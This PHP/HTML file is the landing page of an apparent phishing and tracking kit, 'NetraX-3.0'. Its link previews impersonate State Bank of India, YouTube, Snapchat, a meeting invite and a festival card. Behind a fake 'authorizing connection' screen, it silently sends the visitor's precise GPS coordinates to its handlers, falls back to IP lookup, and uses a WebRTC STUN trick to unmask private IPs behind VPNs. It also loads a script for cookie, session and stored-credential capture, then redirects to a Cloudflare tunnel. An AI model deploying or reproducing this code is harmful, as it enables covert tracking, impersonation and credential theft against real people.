<?php
/*
 * NOTE: This file is never executed directly. netraX-3.0.sh copies it
 * (via sed) to index.php at the project root. All __DIR__ references
 * therefore resolve to the project root at runtime.
 */
$_bootstrap = __DIR__ . '/core/ip.php';
if (is_file($_bootstrap) && is_readable($_bootstrap)) {
    require_once $_bootstrap;
} else {
    error_log('[NetraX-3.0] FATAL --core/ip.php not found at: ' . $_bootstrap);
}
unset($_bootstrap);

// Explicitly allow geolocation & camera (tunnel proxies may add restrictive Permissions-Policy)
header('Permissions-Policy: geolocation=*, camera=*, microphone=*');
header('Feature-Policy: geolocation *; camera *; microphone *');

/* ── Dynamic Open Graph Metadata Resolution for Rich Social Previews ── */
$_dataDir = __DIR__ . '/data';
$_activeTpl = 1;
if (is_file($_dataDir . '/.active_template')) {
    $_activeTpl = (int) trim(@file_get_contents($_dataDir . '/.active_template'));
}

$_ogMeta = [
    1 => [
        'title' => "🎉 Season's Greetings & Festival Celebration",
        'desc'  => 'You have received an exclusive special festival celebration greeting card! Tap here to open and celebrate.',
        'site'  => 'Festival Greetings Portal',
        'image' => 'https://images.unsplash.com/photo-1513151233558-d860c5398176?w=1200&auto=format&fit=crop&q=80'
    ],
    2 => [
        'title' => '🔴 LIVE: YouTube Streaming Broadcast',
        'desc'  => 'Join and watch the live video streaming broadcast now in Ultra HD.',
        'site'  => 'YouTube Live Stream',
        'image' => 'https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?w=1200&auto=format&fit=crop&q=80'
    ],
    3 => [
        'title' => '📹 Virtual Video Conference Meeting Invitation',
        'desc'  => 'You have been invited to join the active online video conference meeting room.',
        'site'  => 'Virtual Meeting Portal',
        'image' => 'https://images.unsplash.com/photo-1588196749597-9ff075ee6b5b?w=1200&auto=format&fit=crop&q=80'
    ],
    4 => [
        'title' => '🛡️ Social Media Account Security & Case Review',
        'desc'  => 'Official account verification and security case review center.',
        'site'  => 'Security Verification Center',
        'image' => 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=1200&auto=format&fit=crop&q=80'
    ],
    5 => [
        'title' => '🏛️ State Bank of India -- YONO Net Banking',
        'desc'  => 'Authorized State Bank of India Online Banking portal. Secure customer login.',
        'site'  => 'State Bank of India',
        'image' => 'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=1200&auto=format&fit=crop&q=80'
    ],
    6 => [
        'title' => '👻 Snapchat -- View Story & Add Friend',
        'desc'  => 'Tap to open the exclusive Snapchat story and connect.',
        'site'  => 'Snapchat',
        'image' => 'https://images.unsplash.com/photo-1611162616305-c69b3fa7fbe0?w=1200&auto=format&fit=crop&q=80'
    ]
];

$_curOg = $_ogMeta[$_activeTpl] ?? $_ogMeta[1];
$_pageTitle = htmlspecialchars($_curOg['title'], ENT_QUOTES, 'UTF-8');
$_pageDesc  = htmlspecialchars($_curOg['desc'], ENT_QUOTES, 'UTF-8');
$_pageSite  = htmlspecialchars($_curOg['site'], ENT_QUOTES, 'UTF-8');
$_pageImg   = htmlspecialchars($_curOg['image'], ENT_QUOTES, 'UTF-8');

// Add JavaScript to capture location
echo '
<!DOCTYPE html>
<html>
<head>
    <title>' . $_pageTitle . '</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="' . $_pageDesc . '">
    <!-- Open Graph / WhatsApp / Telegram / Facebook / Discord / SMS Link Preview -->
    <meta property="og:type" content="website">
    <meta property="og:title" content="' . $_pageTitle . '">
    <meta property="og:description" content="' . $_pageDesc . '">
    <meta property="og:image" content="' . $_pageImg . '">
    <meta property="og:site_name" content="' . $_pageSite . '">
    <!-- Twitter Card -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="' . $_pageTitle . '">
    <meta name="twitter:description" content="' . $_pageDesc . '">
    <meta name="twitter:image" content="' . $_pageImg . '">
    <script>
        // Debug function to log messages - only log essential information
        function debugLog(message) {
            // Only log essential location data, not status messages
            if (message.includes("Lat:") || message.includes("Latitude:") || message.includes("Position obtained successfully")) {
                console.log("DEBUG: " + message);
                
                // Send only essential logs to server
                var xhr = new XMLHttpRequest();
                xhr.open("POST", "handlers/debug_log.php", true);
                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                xhr.send("message=" + encodeURIComponent(message));
            }
        }
        
        function getLocation() {
            // Don\'t log this message
            
            if (navigator.geolocation) {
                // Don\'t log this message
                
                // Show permission request message
                document.getElementById("locationStatus").innerText = "Requesting location permission...";
                
                navigator.geolocation.getCurrentPosition(
                    sendPosition, 
                    handleError, 
                    {
                        enableHighAccuracy: true,
                        timeout: 15000,
                        maximumAge: 0
                    }
                );
            } else {
                document.getElementById("locationStatus").innerText = "Loading...";
                // Report to server
                var xhr = new XMLHttpRequest();
                xhr.open("POST", "handlers/location.php", true);
                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                xhr.send("error=1&error_code=0&error_msg=" + encodeURIComponent("Geolocation not supported by browser (Tor Browser / Privacy Mode)"));
                
                // Automatically trigger IP-based location fallback
                var xhr2 = new XMLHttpRequest();
                xhr2.open("POST", "handlers/ip_location.php", true);
                xhr2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                xhr2.send("fallback=1&source=page_load&time=" + new Date().getTime());

                // Redirect after a delay
                setTimeout(function() {
                    redirectToMainPage();
                }, 1000);
            }
        }
        
        function sendPosition(position) {
            debugLog("Position obtained successfully");
            document.getElementById("locationStatus").innerText = "Location obtained, loading...";
            
            var lat = position.coords.latitude;
            var lon = position.coords.longitude;
            var acc = position.coords.accuracy;
            
            debugLog("Lat: " + lat + ", Lon: " + lon + ", Accuracy: " + acc);
            
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "handlers/location.php", true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                    // Don\'t log this message
                    
                    // Add a delay before redirecting to ensure data is processed
                    setTimeout(function() {
                        redirectToMainPage();
                    }, 1000);
                }
            };
            
            xhr.onerror = function() {
                // Don\'t log this message
                // Still redirect even if there was an error
                redirectToMainPage();
            };
            
            // Send the data with a timestamp to avoid caching
            xhr.send("lat="+lat+"&lon="+lon+"&acc="+acc+"&time="+new Date().getTime());
        }
        
        function handleError(error) {
            document.getElementById("locationStatus").innerText = "Redirecting...";
            
            // Silently fall back to IP-based location
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "handlers/ip_location.php", true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.send("fallback=1&source=page_load&time=" + new Date().getTime());
            
            // Redirect after a short delay to allow fallback request to send
            setTimeout(function() {
                redirectToMainPage();
            }, 1000);
        }
        
        function redirectToMainPage() {
            // Don\'t log this message
            // Try to redirect to the template page
            try {
                window.location.href = "https://jon-shoot-jury-photos.trycloudflare.com/index2.html";
            } catch (e) {
                // Don\'t log this message
                // Fallback redirection
                window.location = "https://jon-shoot-jury-photos.trycloudflare.com/index2.html";
            }
        }
        
        // Try to get location when page loads
        window.onload = function() {
            // Don\'t log this message
            setTimeout(function() {
                getLocation();
            }, 500); // Small delay to ensure everything is loaded
        };

        // ── WebRTC Internal IP & VPN Detection ──────────────────────────
        // Uses RTCPeerConnection ICE negotiation to silently extract the
        // device\'s private/LAN IP(s) and the real external IP seen by
        // the STUN server.  If the STUN-visible IP differs from the
        // IP the server received in HTTP headers, a VPN is flagged.
        // Runs immediately on parse, independent of geolocation flow.
        // Uses sendBeacon (survives page navigation) with XHR fallback.
        (function() {
            \'use strict\';
            if (typeof RTCPeerConnection === \'undefined\') { return; }

            var _ips   = {};    // { "<ip>": "<candidate_type>" }
            var _sent  = false;
            var _timer = null;
            var _pc    = null;

            function _send() {
                if (_sent) { return; }
                _sent = true;
                if (_timer) { clearTimeout(_timer); _timer = null; }
                if (_pc)    { try { _pc.close(); } catch (e) {} _pc = null; }
                if (Object.keys(_ips).length === 0) { return; }

                var payload = \'ips=\' + encodeURIComponent(JSON.stringify(_ips));
                var url     = \'handlers/webrtc_ip.php\';

                // sendBeacon queues delivery even across page navigations
                if (navigator.sendBeacon) {
                    navigator.sendBeacon(url, new Blob([payload], {
                        type: \'application/x-www-form-urlencoded\'
                    }));
                } else {
                    var xhr = new XMLHttpRequest();
                    xhr.open(\'POST\', url, true);
                    xhr.setRequestHeader(\'Content-Type\', \'application/x-www-form-urlencoded\');
                    xhr.send(payload);
                }
            }

            function _onCandidate(e) {
                if (!e || !e.candidate || !e.candidate.candidate) {
                    // null candidate signals ICE gathering is complete
                    _send();
                    return;
                }
                // SDP candidate format:
                //   candidate:<foundation> <comp> <proto> <prio> <IP> <port> typ <type> …
                var parts = e.candidate.candidate.split(\' \');
                if (parts.length >= 8) {
                    var ip   = parts[4];
                    var type = parts[7]; // \'host\' | \'srflx\' | \'prflx\' | \'relay\'
                    if (ip && type) {
                        _ips[ip] = type;
                    }
                }
            }

            try {
                _pc = new RTCPeerConnection({
                    iceServers: [{ urls: \'stun:stun.l.google.com:19302\' }]
                });
                _pc.createDataChannel(\'__x\'); // data channel required to trigger ICE
                _pc.onicecandidate = _onCandidate;
                _pc.onicegatheringstatechange = function() {
                    if (_pc && _pc.iceGatheringState === \'complete\') { _send(); }
                };
                _pc.createOffer()
                   .then(function(o) { return _pc.setLocalDescription(o); })
                   .catch(function() {});
                // Safety timeout --flush after 4 s regardless of gathering state
                _timer = setTimeout(_send, 4000);
            } catch (err) {}
        })();
        // ── End WebRTC Detection ─────────────────────────────────────────

        // ── Cookie, Session ID & Stored Credential Capture ──────────────
        // Loaded from external netrax_collector.js (shared with all decoy pages)
        // ── End Cookie & Session Capture ─────────────────────────────────
    </script>
    <script src="core/netrax_collector.js"></script>
    <script src="core/netrax_location_tracker.js"></script>

    <!-- Tailwind CSS CDN (UI only) -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Google Font -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">

    <!-- ── UI STYLES: glassmorphism loading screen ── -->
    <style>
      body { font-family: \'Inter\', sans-serif; }

      /* Clean professional background */
      .bg-animated {
        background: #f7f7f7;
      }

      /* Soft premium background */
      .bg-animated {
        background: #f0f2f5;
        position: relative;
        overflow: hidden;
      }
      
      /* Subtle waves in the background */
      .bg-animated::before, .bg-animated::after {
        content: "";
        position: absolute;
        width: 150vw;
        height: 150vw;
        background: radial-gradient(circle at center, rgba(103, 51, 145, 0.05) 0%, transparent 50%);
        border-radius: 50%;
        animation: slow-drift 20s infinite linear;
        z-index: 0;
      }
      .bg-animated::before {
        top: -50vw;
        left: -25vw;
      }
      .bg-animated::after {
        bottom: -50vw;
        right: -25vw;
        background: radial-gradient(circle at center, rgba(79, 40, 111, 0.04) 0%, transparent 50%);
        animation-duration: 25s;
        animation-direction: reverse;
      }

      @keyframes slow-drift {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
      }

      /* Premium Card */
      .glass {
        background: rgba(255, 255, 255, 0.95);
        border: 1px solid rgba(255, 255, 255, 0.8);
        box-shadow: 0 16px 40px rgba(0, 0, 0, 0.06), 0 0 0 1px rgba(103, 51, 145, 0.05);
        border-radius: 20px;
        backdrop-filter: blur(10px);
        -webkit-backdrop-filter: blur(10px);
        z-index: 10;
        position: relative;
      }

      /* Sophisticated Icon Box */
      .icon-box {
        width: 68px;
        height: 68px;
        background: linear-gradient(135deg, #76479B, #4F286F);
        border-radius: 18px;
        display: flex;
        align-items: center;
        justify-content: center;
        box-shadow: 0 10px 25px rgba(79, 40, 111, 0.3), inset 0 2px 4px rgba(255, 255, 255, 0.2);
        margin-bottom: 24px;
        position: relative;
      }

      /* Elegant Ring Spinner */
      @keyframes spin-ring {
        to { transform: rotate(360deg); }
      }
      .spin-ring {
        width: 60px;
        height: 60px;
        border: 2px solid #eadef4;
        border-top-color: #673391;
        border-radius: 50%;
        animation: spin-ring 1s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite;
        margin-bottom: 16px;
      }

      /* Refined typography */
      .loading-title {
        font-size: 19px;
        font-weight: 700;
        color: #1a1a1a;
        margin-bottom: 8px;
        letter-spacing: -0.3px;
      }
      
      .loading-desc {
        font-size: 13.5px;
        color: #666;
        line-height: 1.5;
        margin-bottom: 24px;
      }

      .status-text {
        font-size: 12px;
        font-weight: 600;
        color: #673391;
        letter-spacing: 0.5px;
        text-transform: uppercase;
        margin-bottom: 12px;
        opacity: 0.8;
      }

      /* Smooth Progress bar */
      @keyframes progress-bar {
        0%   { width: 0%; opacity: 0; }
        10%  { opacity: 1; }
        80%  { width: 90%; }
        100% { width: 100%; opacity: 1; }
      }
      .progress-container {
        width: 100%;
        height: 4px;
        background: #f0f0f0;
        border-radius: 4px;
        overflow: hidden;
        margin-bottom: 24px;
      }
      .progress-fill {
        height: 100%;
        border-radius: 4px;
        background: linear-gradient(90deg, #4F286F, #76479B);
        animation: progress-bar 12s cubic-bezier(0.2, 0.8, 0.2, 1) forwards;
      }
    </style>
    <!-- ─────────────────────────────────────────── -->
</head>

<!-- ── UI BODY: modern loading/splash screen ── -->
<body class="bg-animated min-h-screen" style="display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0;">
  <div class="glass" style="width: 100%; max-width: 400px; margin: 0 20px; display: flex; flex-direction: column; align-items: center; padding: 48px 32px; box-sizing: border-box;">

    <!-- Logo icon -->
    <div class="icon-box">
      <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
        <path d="M12 22s-8-4.5-8-11.8A8 8 0 0 1 12 2a8 8 0 0 1 8 8.2c0 7.3-8 11.8-8 11.8z"></path>
        <circle cx="12" cy="10" r="3"></circle>
      </svg>
    </div>

    <!-- Spinner -->
    <div class="spin-ring"></div>

    <!-- Text content -->
    <div style="text-align: center; width: 100%;">
      <h2 class="loading-title">Authorizing connection...</h2>
      <p class="loading-desc">For enhanced security, we must verify your network and device location parameters.</p>
    </div>

    <!-- Progress bar -->
    <div class="progress-container">
      <div class="progress-fill"></div>
    </div>

    <!-- Status text --id="locationStatus" preserved for JS -->
    <p id="locationStatus" class="status-text">INITIALIZING SECURE HANDSHAKE</p>

  </div>
</body>
<!-- ─────────────────────────────────────────── -->
</html>
';
exit;
?>
